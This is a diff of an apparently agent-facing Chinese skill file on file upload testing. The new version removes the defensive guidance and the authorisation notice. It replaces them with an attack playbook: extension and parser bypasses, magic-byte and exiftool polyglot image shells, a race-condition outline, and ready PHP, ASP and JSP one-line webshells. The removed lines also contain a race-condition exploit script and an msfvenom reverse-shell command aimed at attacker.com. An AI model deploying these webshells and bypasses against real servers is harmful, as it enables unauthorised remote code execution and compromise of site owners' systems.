@@ -1,328 +1,107 @@
 ---
 name: file-upload-testing
-description: 文件上传漏洞测试的专业技能和方法论
-version: 1.0.0
+description: 文件上传漏洞测试，覆盖检测→后缀绕过→内容绕过→条件竞争→云存储利用→WebShell写入全流程
 ---
 
 # 文件上传漏洞测试
 
 ## 概述
 
-文件上传功能是Web应用常见功能，但存在多种安全风险。本技能提供文件上传漏洞的检测、利用和防护方法。
+文件上传是获取WebShell的最直接途径。本技能覆盖从检测到利用的完整方法。
 
-## 漏洞类型
+## 1. 上传点检测
 
-### 1. 未验证文件类型
-
-**仅前端验证：**
-```javascript
-// 可被绕过
-if (!file.name.endsWith('.jpg')) {
-  alert('只允许上传图片');
-}
+```
+常见上传点:
+- 头像上传 / 文件共享 / 文档管理 / 导入功能
+- API文件上传接口 / 富文本编辑器图片上传
+- 插件/主题上传 (WordPress等)
 ```
 
-### 2. 文件内容未验证
+## 2. 后缀名绕过
 
-**仅检查扩展名：**
-```php
-// 危险代码
-if (pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION) == 'jpg') {
-  move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $filename);
-}
-```
-
-### 3. 路径遍历
-
-**未过滤文件名：**
-```
-filename: ../../../etc/passwd
-filename: ..\..\..\windows\system32\config\sam
-```
-
-### 4. 文件名覆盖
-
-**可预测的文件名：**
-```
-uploads/1.jpg
-uploads/2.jpg
-```
-
-## 测试方法
-
-### 1. 基础检测
-
-**测试各种文件类型：**
-- .php, .jsp, .asp, .aspx
-- .php3, .php4, .php5, .phtml
-- .jspx, .jspf
-- .htaccess, .htpasswd
-
-**测试双扩展名：**
-```
-shell.php.jpg
-shell.jpg.php
-```
-
-**测试大小写：**
-```
-shell.PHP
-shell.PhP
-```
-
-### 2. 内容类型绕过
-
-**修改Content-Type：**
-```
-Content-Type: image/jpeg
-# 但文件内容是PHP代码
-```
-
-**Magic Bytes：**
-```php
-// 在PHP代码前添加图片头
-GIF89a<?php phpinfo(); ?>
-```
-
-### 3. 解析漏洞
-
-**Apache解析漏洞：**
-```
-shell.php.xxx  # Apache可能解析为PHP
-```
-
-**IIS解析漏洞：**
-```
-shell.asp;.jpg
-shell.asp:.jpg
-```
-
-**Nginx解析漏洞：**
-```
-shell.jpg%00.php
-```
-
-### 4. 竞争条件
-
-**文件上传后立即访问：**
-```python
-# 上传.php文件，在上传完成但删除前访问
-import requests
-import threading
-
-def upload():
-    files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>')}
-    requests.post('http://target.com/upload', files=files)
-
-def access():
-    time.sleep(0.1)
-    requests.get('http://target.com/uploads/shell.php?cmd=id')
-
-threading.Thread(target=upload).start()
-threading.Thread(target=access).start()
-```
-
-## 利用技术
-
-### PHP WebShell
-
-**基础WebShell：**
-```php
-<?php system($_GET['cmd']); ?>
-```
-
-**一句话木马：**
-```php
-<?php eval($_POST['a']); ?>
-```
-
-**绕过过滤：**
-```php
-<?php
-$_GET['cmd']($_POST['a']);
-// 使用: ?cmd=system
-```
-
-### .htaccess利用
-
-**上传.htaccess：**
-```
-AddType application/x-httpd-php .jpg
-```
-
-**然后上传shell.jpg（实际是PHP代码）**
-
-### 图片马
-
-**GIF图片马：**
-```php
-GIF89a
-<?php
-phpinfo();
-?>
-```
-
-**PNG图片马：**
-```bash
-# 使用工具将PHP代码嵌入PNG
-python3 png2php.py shell.php shell.png
-```
-
-### 文件包含配合
-
-**如果存在文件包含漏洞：**
-```
-# 上传包含PHP代码的图片
-# 然后通过文件包含执行
-?file=uploads/shell.jpg
-```
-
-## 绕过技术
-
-### 扩展名绕过
-
-**双扩展名：**
-```
-shell.php.jpg
-shell.php;.jpg
-shell.php%00.jpg
-```
-
-**大小写：**
-```
-shell.PHP
-shell.PhP
-```
-
-**特殊字符：**
-```
-shell.php.
-shell.php 
-shell.php%20
-```
-
-### Content-Type绕过
-
-**修改请求头：**
-```
-Content-Type: image/jpeg
-Content-Type: image/png
-Content-Type: image/gif
-```
-
-### Magic Bytes绕过
-
-**添加文件头：**
-```php
-// JPEG
-\xFF\xD8\xFF\xE0<?php phpinfo(); ?>
-
-// GIF
-GIF89a<?php phpinfo(); ?>
-
-// PNG
-\x89\x50\x4E\x47<?php phpinfo(); ?>
-```
-
-### 代码混淆
-
-**使用短标签：**
-```php
-<?= system($_GET['cmd']); ?>
-```
-
-**使用变量：**
-```php
-<?php
-$a='sys';
-$b='tem';
-$a.$b($_GET['cmd']);
-```
-
-## 工具使用
-
-### Burp Suite
-
-1. 拦截文件上传请求
-2. 修改文件名和内容
-3. 测试各种绕过技术
-
-### Upload Bypass
+### 2.1 黑名单绕过
 
 ```bash
-# 使用各种技术测试文件上传
-python upload_bypass.py -u http://target.com/upload -f shell.php
+# PHP可执行后缀
+.php .php3 .php4 .php5 .php7 .phtml .pht .phar .phps .shtml
+# ASP/ASPX
+.asp .aspx .asa .cer .cdx .ashx .asmx .ascx
+# JSP
+.jsp .jspx .jspf .jsw .jsv
+# 其他
+.php. .php.jpg .php;.jpg .php%00.jpg .php.jpg (双重扩展名)
+.PHP (大小写) .Php .pHp
 ```
 
-### WebShell生成
+### 2.2 解析漏洞利用
+
+```
+Apache:  .php.xxx → 从右向左找未知扩展名, 找到.php执行
+IIS 6:   /xxx.asp/ → 目录名为.asp, 目录下所有文件当ASP执行
+         xx.asp;.jpg → 分号截断
+IIS 7.5: xx.jpg/xx.php → 条件put+move
+Nginx:   xx.jpg%00.php → 00截断(旧版)
+         xx.jpg/.php → 配置错误
+```
+
+## 3. 内容验证绕过
+
+### 3.1 文件头伪造
 
 ```bash
-# 生成各种WebShell
-msfvenom -p php/meterpreter/reverse_tcp LHOST=attacker.com LPORT=4444 -f raw > shell.php
+# 在PHP代码前加图片文件头
+GIF89a <?php @eval($_POST[1]);?>
+\x89PNG <?php @eval($_POST[1]);?>
 ```
 
-## 验证和报告
+### 3.2 getimagesize() 绕过
 
-### 验证步骤
+```bash
+# 生成带PHP代码的合法图片
+# 方法1: 在真实图片末尾追加PHP代码
+copy /b original.jpg + shell.php payload.jpg
 
-1. 确认可以上传恶意文件
-2. 验证文件可以执行
-3. 评估影响（命令执行、数据泄露等）
-4. 记录完整的POC
+# 方法2: exiftool注入
+exiftool -Comment='<?php @eval($_POST[1]);?>' image.jpg
 
-### 报告要点
+# 方法3: 图片马 + 文件包含组合利用
+# 上传图片马 → LFI包含 → 代码执行
+```
 
-- 漏洞位置和上传功能
-- 可上传的文件类型和执行方式
-- 完整的利用步骤和PoC
-- 修复建议（文件类型验证、内容检查、安全存储等）
+## 4. 条件竞争
 
-## 防护措施
+```bash
+# 目标: 文件先上传到临时目录, 再检查+移动
+# 在检查窗口期访问临时文件
 
-### 推荐方案
+# Turbo Intruder脚本 (race条件):
+# 同时发送: 上传请求 + 访问临时路径请求
+```
 
-1. **文件类型白名单**
-   ```python
-   ALLOWED_EXTENSIONS = {'jpg', 'png', 'gif'}
-   ext = filename.rsplit('.', 1)[1].lower()
-   if ext not in ALLOWED_EXTENSIONS:
-       raise ValueError("File type not allowed")
-   ```
+## 5. 写WebShell
 
-2. **文件内容验证**
-   ```python
-   import magic
-   file_type = magic.from_buffer(file_content, mime=True)
-   if not file_type.startswith('image/'):
-       raise ValueError("Invalid file content")
-   ```
+```php
+# === PHP一句话 ===
+<?php @eval($_POST[1]);?>
+<?=system($_GET['cmd'])?>
+<?=`$_GET[1]`?>
 
-3. **重命名文件**
-   ```python
-   import uuid
-   filename = str(uuid.uuid4()) + '.' + ext
-   ```
+# === ASP一句话 ===
+<%eval request("1")%>
 
-4. **隔离存储**
-   - 文件存储在Web根目录外
-   - 通过脚本代理访问
-   - 禁用执行权限
+# === JSP一句话 ===
+<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
+```
 
-5. **文件扫描**
-   - 使用杀毒软件扫描
-   - 检查文件内容
-   - 移除可执行权限
+## 6. 绕过CDN/云存储
 
-6. **大小限制**
-   ```python
-   MAX_SIZE = 5 * 1024 * 1024  # 5MB
-   if file.size > MAX_SIZE:
-       raise ValueError("File too large")
-   ```
+```bash
+# AWS S3 → 上传公开读文件
+# 阿里云OSS → 上传跨域XML
+# SSRF → 上传到内网
+```
 
-## 注意事项
+---
 
-- 仅在授权测试环境中进行
-- 避免上传恶意文件到生产环境
-- 测试后及时清理
-- 注意不同服务器的解析差异
+*参考: OWASP File Upload + 实战经验整理*
